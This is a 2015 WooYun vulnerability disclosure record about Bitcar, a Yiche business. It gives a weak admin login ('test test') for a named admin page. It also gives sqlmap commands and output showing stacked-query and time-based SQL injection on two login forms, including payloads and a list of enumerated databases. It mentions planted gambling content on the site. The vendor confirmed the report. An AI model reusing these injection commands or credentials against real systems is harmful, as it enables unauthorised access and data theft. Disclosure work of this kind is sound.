{"id": 46376, "wybug_id": "wooyun-2015-091338", "wybug_title": "易车网某业务多处漏洞(后台弱口令、SQL注入等)", "wybug_corp": "易车", "wybug_author": "玉林嘎", "wybug_date": "2015-01-12 12:28", "wybug_open_date": "2015-02-26 12:30", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： 求高rank 详细说明：  http://www.bitcar.com/ 易卡互动 为易车网旗下业务第一处:http://www.bitcar.com/admin/Manage.aspx 弱口令 test test\n\n第二处：2个sql注入http://dsa.bitcar.com 该站前台及后台登陆均存在post注入1、sqlmap -u \"http://dsa.bitcar.com/Login.aspx?methed=checkLogin\" --data \"format=html&username=admin&password=123456&isAutoLogin=0\" -p \"username\"\nPlace: POSTParameter: username    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: format=html&username=admin'; WAITFOR DELAY '0:0:5'--&password=123456&isAutoLogin=0    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: format=html&username=admin' WAITFOR DELAY '0:0:5'--&password=123456&isAutoLogin=0---[12:16:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\nsqlmap -u \"http://dsa.bitcar.com/Login.aspx?methed=checkLogin\" --data \"format=html&username=admin&password=123456&isAutoLogin=0\" -p \"username\" --dbs\navailable databases [17]:[*] [TfsTaskManagement\t][*] AppfabricServiceRepository[*] bc[*] BitCar[*] Devbbs[*] dzbbs[*] EquipmentsManagement[*] ipad[*] ITOMS[*] ITSupportLibrary[*] master[*] model[*] msdb[*] ResourceMonitoring[*] tempdb[*] TfsManager[*] WorkFlowStore\n2、sqlmap -u \"http://dsa.bitcar.com/Page/Manage/Login.aspx\" --data \"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt%2BWQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS%2FxNgHjvhP9i5tBk%2FVAcH8hvDkVw%3D%3D&__EVENTVALIDATION=%2FwEWBALAkP%2FHDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123&txtPassWord=123123&login_submit.x=52&login_submit.y=18\"\nPlace: POSTParameter: txtUserName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt+WQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS/xNgHjvhP9i5tBk/VAcH8hvDkVw==&__EVENTVALIDATION=/wEWBALAkP/HDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123'; WAITFOR DELAY '0:0:5'--&txtPassWord=123123&login_submit.x=52&login_submit.y=18    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt+WQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS/xNgHjvhP9i5tBk/VAcH8hvDkVw==&__EVENTVALIDATION=/wEWBALAkP/HDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123' WAITFOR DELAY '0:0:5'--&txtPassWord=123123&login_submit.x=52&login_submit.y=18---[12:18:10] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n第三处：http://www.bitcar.com   被挂博彩\n\n   漏洞证明：  http://www.bitcar.com/ 易卡互动 为易车网旗下业务第一处:http://www.bitcar.com/admin/Manage.aspx 弱口令 test test\n\n第二处：2个sql注入http://dsa.bitcar.com 该站前台及后台登陆均存在post注入1、sqlmap -u \"http://dsa.bitcar.com/Login.aspx?methed=checkLogin\" --data \"format=html&username=admin&password=123456&isAutoLogin=0\" -p \"username\"\nPlace: POSTParameter: username    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: format=html&username=admin'; WAITFOR DELAY '0:0:5'--&password=123456&isAutoLogin=0    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: format=html&username=admin' WAITFOR DELAY '0:0:5'--&password=123456&isAutoLogin=0---[12:16:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\nsqlmap -u \"http://dsa.bitcar.com/Login.aspx?methed=checkLogin\" --data \"format=html&username=admin&password=123456&isAutoLogin=0\" -p \"username\" --dbs\navailable databases [17]:[*] [TfsTaskManagement\t][*] AppfabricServiceRepository[*] bc[*] BitCar[*] Devbbs[*] dzbbs[*] EquipmentsManagement[*] ipad[*] ITOMS[*] ITSupportLibrary[*] master[*] model[*] msdb[*] ResourceMonitoring[*] tempdb[*] TfsManager[*] WorkFlowStore\n2、sqlmap -u \"http://dsa.bitcar.com/Page/Manage/Login.aspx\" --data \"__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt%2BWQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS%2FxNgHjvhP9i5tBk%2FVAcH8hvDkVw%3D%3D&__EVENTVALIDATION=%2FwEWBALAkP%2FHDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123&txtPassWord=123123&login_submit.x=52&login_submit.y=18\"\nPlace: POSTParameter: txtUserName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt+WQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS/xNgHjvhP9i5tBk/VAcH8hvDkVw==&__EVENTVALIDATION=/wEWBALAkP/HDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123'; WAITFOR DELAY '0:0:5'--&txtPassWord=123123&login_submit.x=52&login_submit.y=18    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKLTQ2MTcxMjc1MQ9kFgICAQ9kFgICBw8PFgIeBFRleHQFGOeUqOaIt+WQjeaIluWvhueggemUmeivr2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxsb2dpbl9zdWJtaXS/xNgHjvhP9i5tBk/VAcH8hvDkVw==&__EVENTVALIDATION=/wEWBALAkP/HDAKl1bKzCQK1qbSWCwKFlvTPA2xB19JRskeB1JdC4eNSwq6Ciu9L&txtUserName=123123' WAITFOR DELAY '0:0:5'--&txtPassWord=123123&login_submit.x=52&login_submit.y=18---[12:18:10] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n第三处：http://www.bitcar.com   被挂博彩\n\n   修复方案：  好好修复下    版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-12 12:30 厂商回复： 非常感谢对易车的帮助，我们会尽快处理 最新状态： 2015-01-12：感谢对易车的关注，我们已经屏蔽了网站漏洞  ", "replys": "漏洞评价：\n评论\n     2015-02-26 13:22 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  屏蔽哎……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}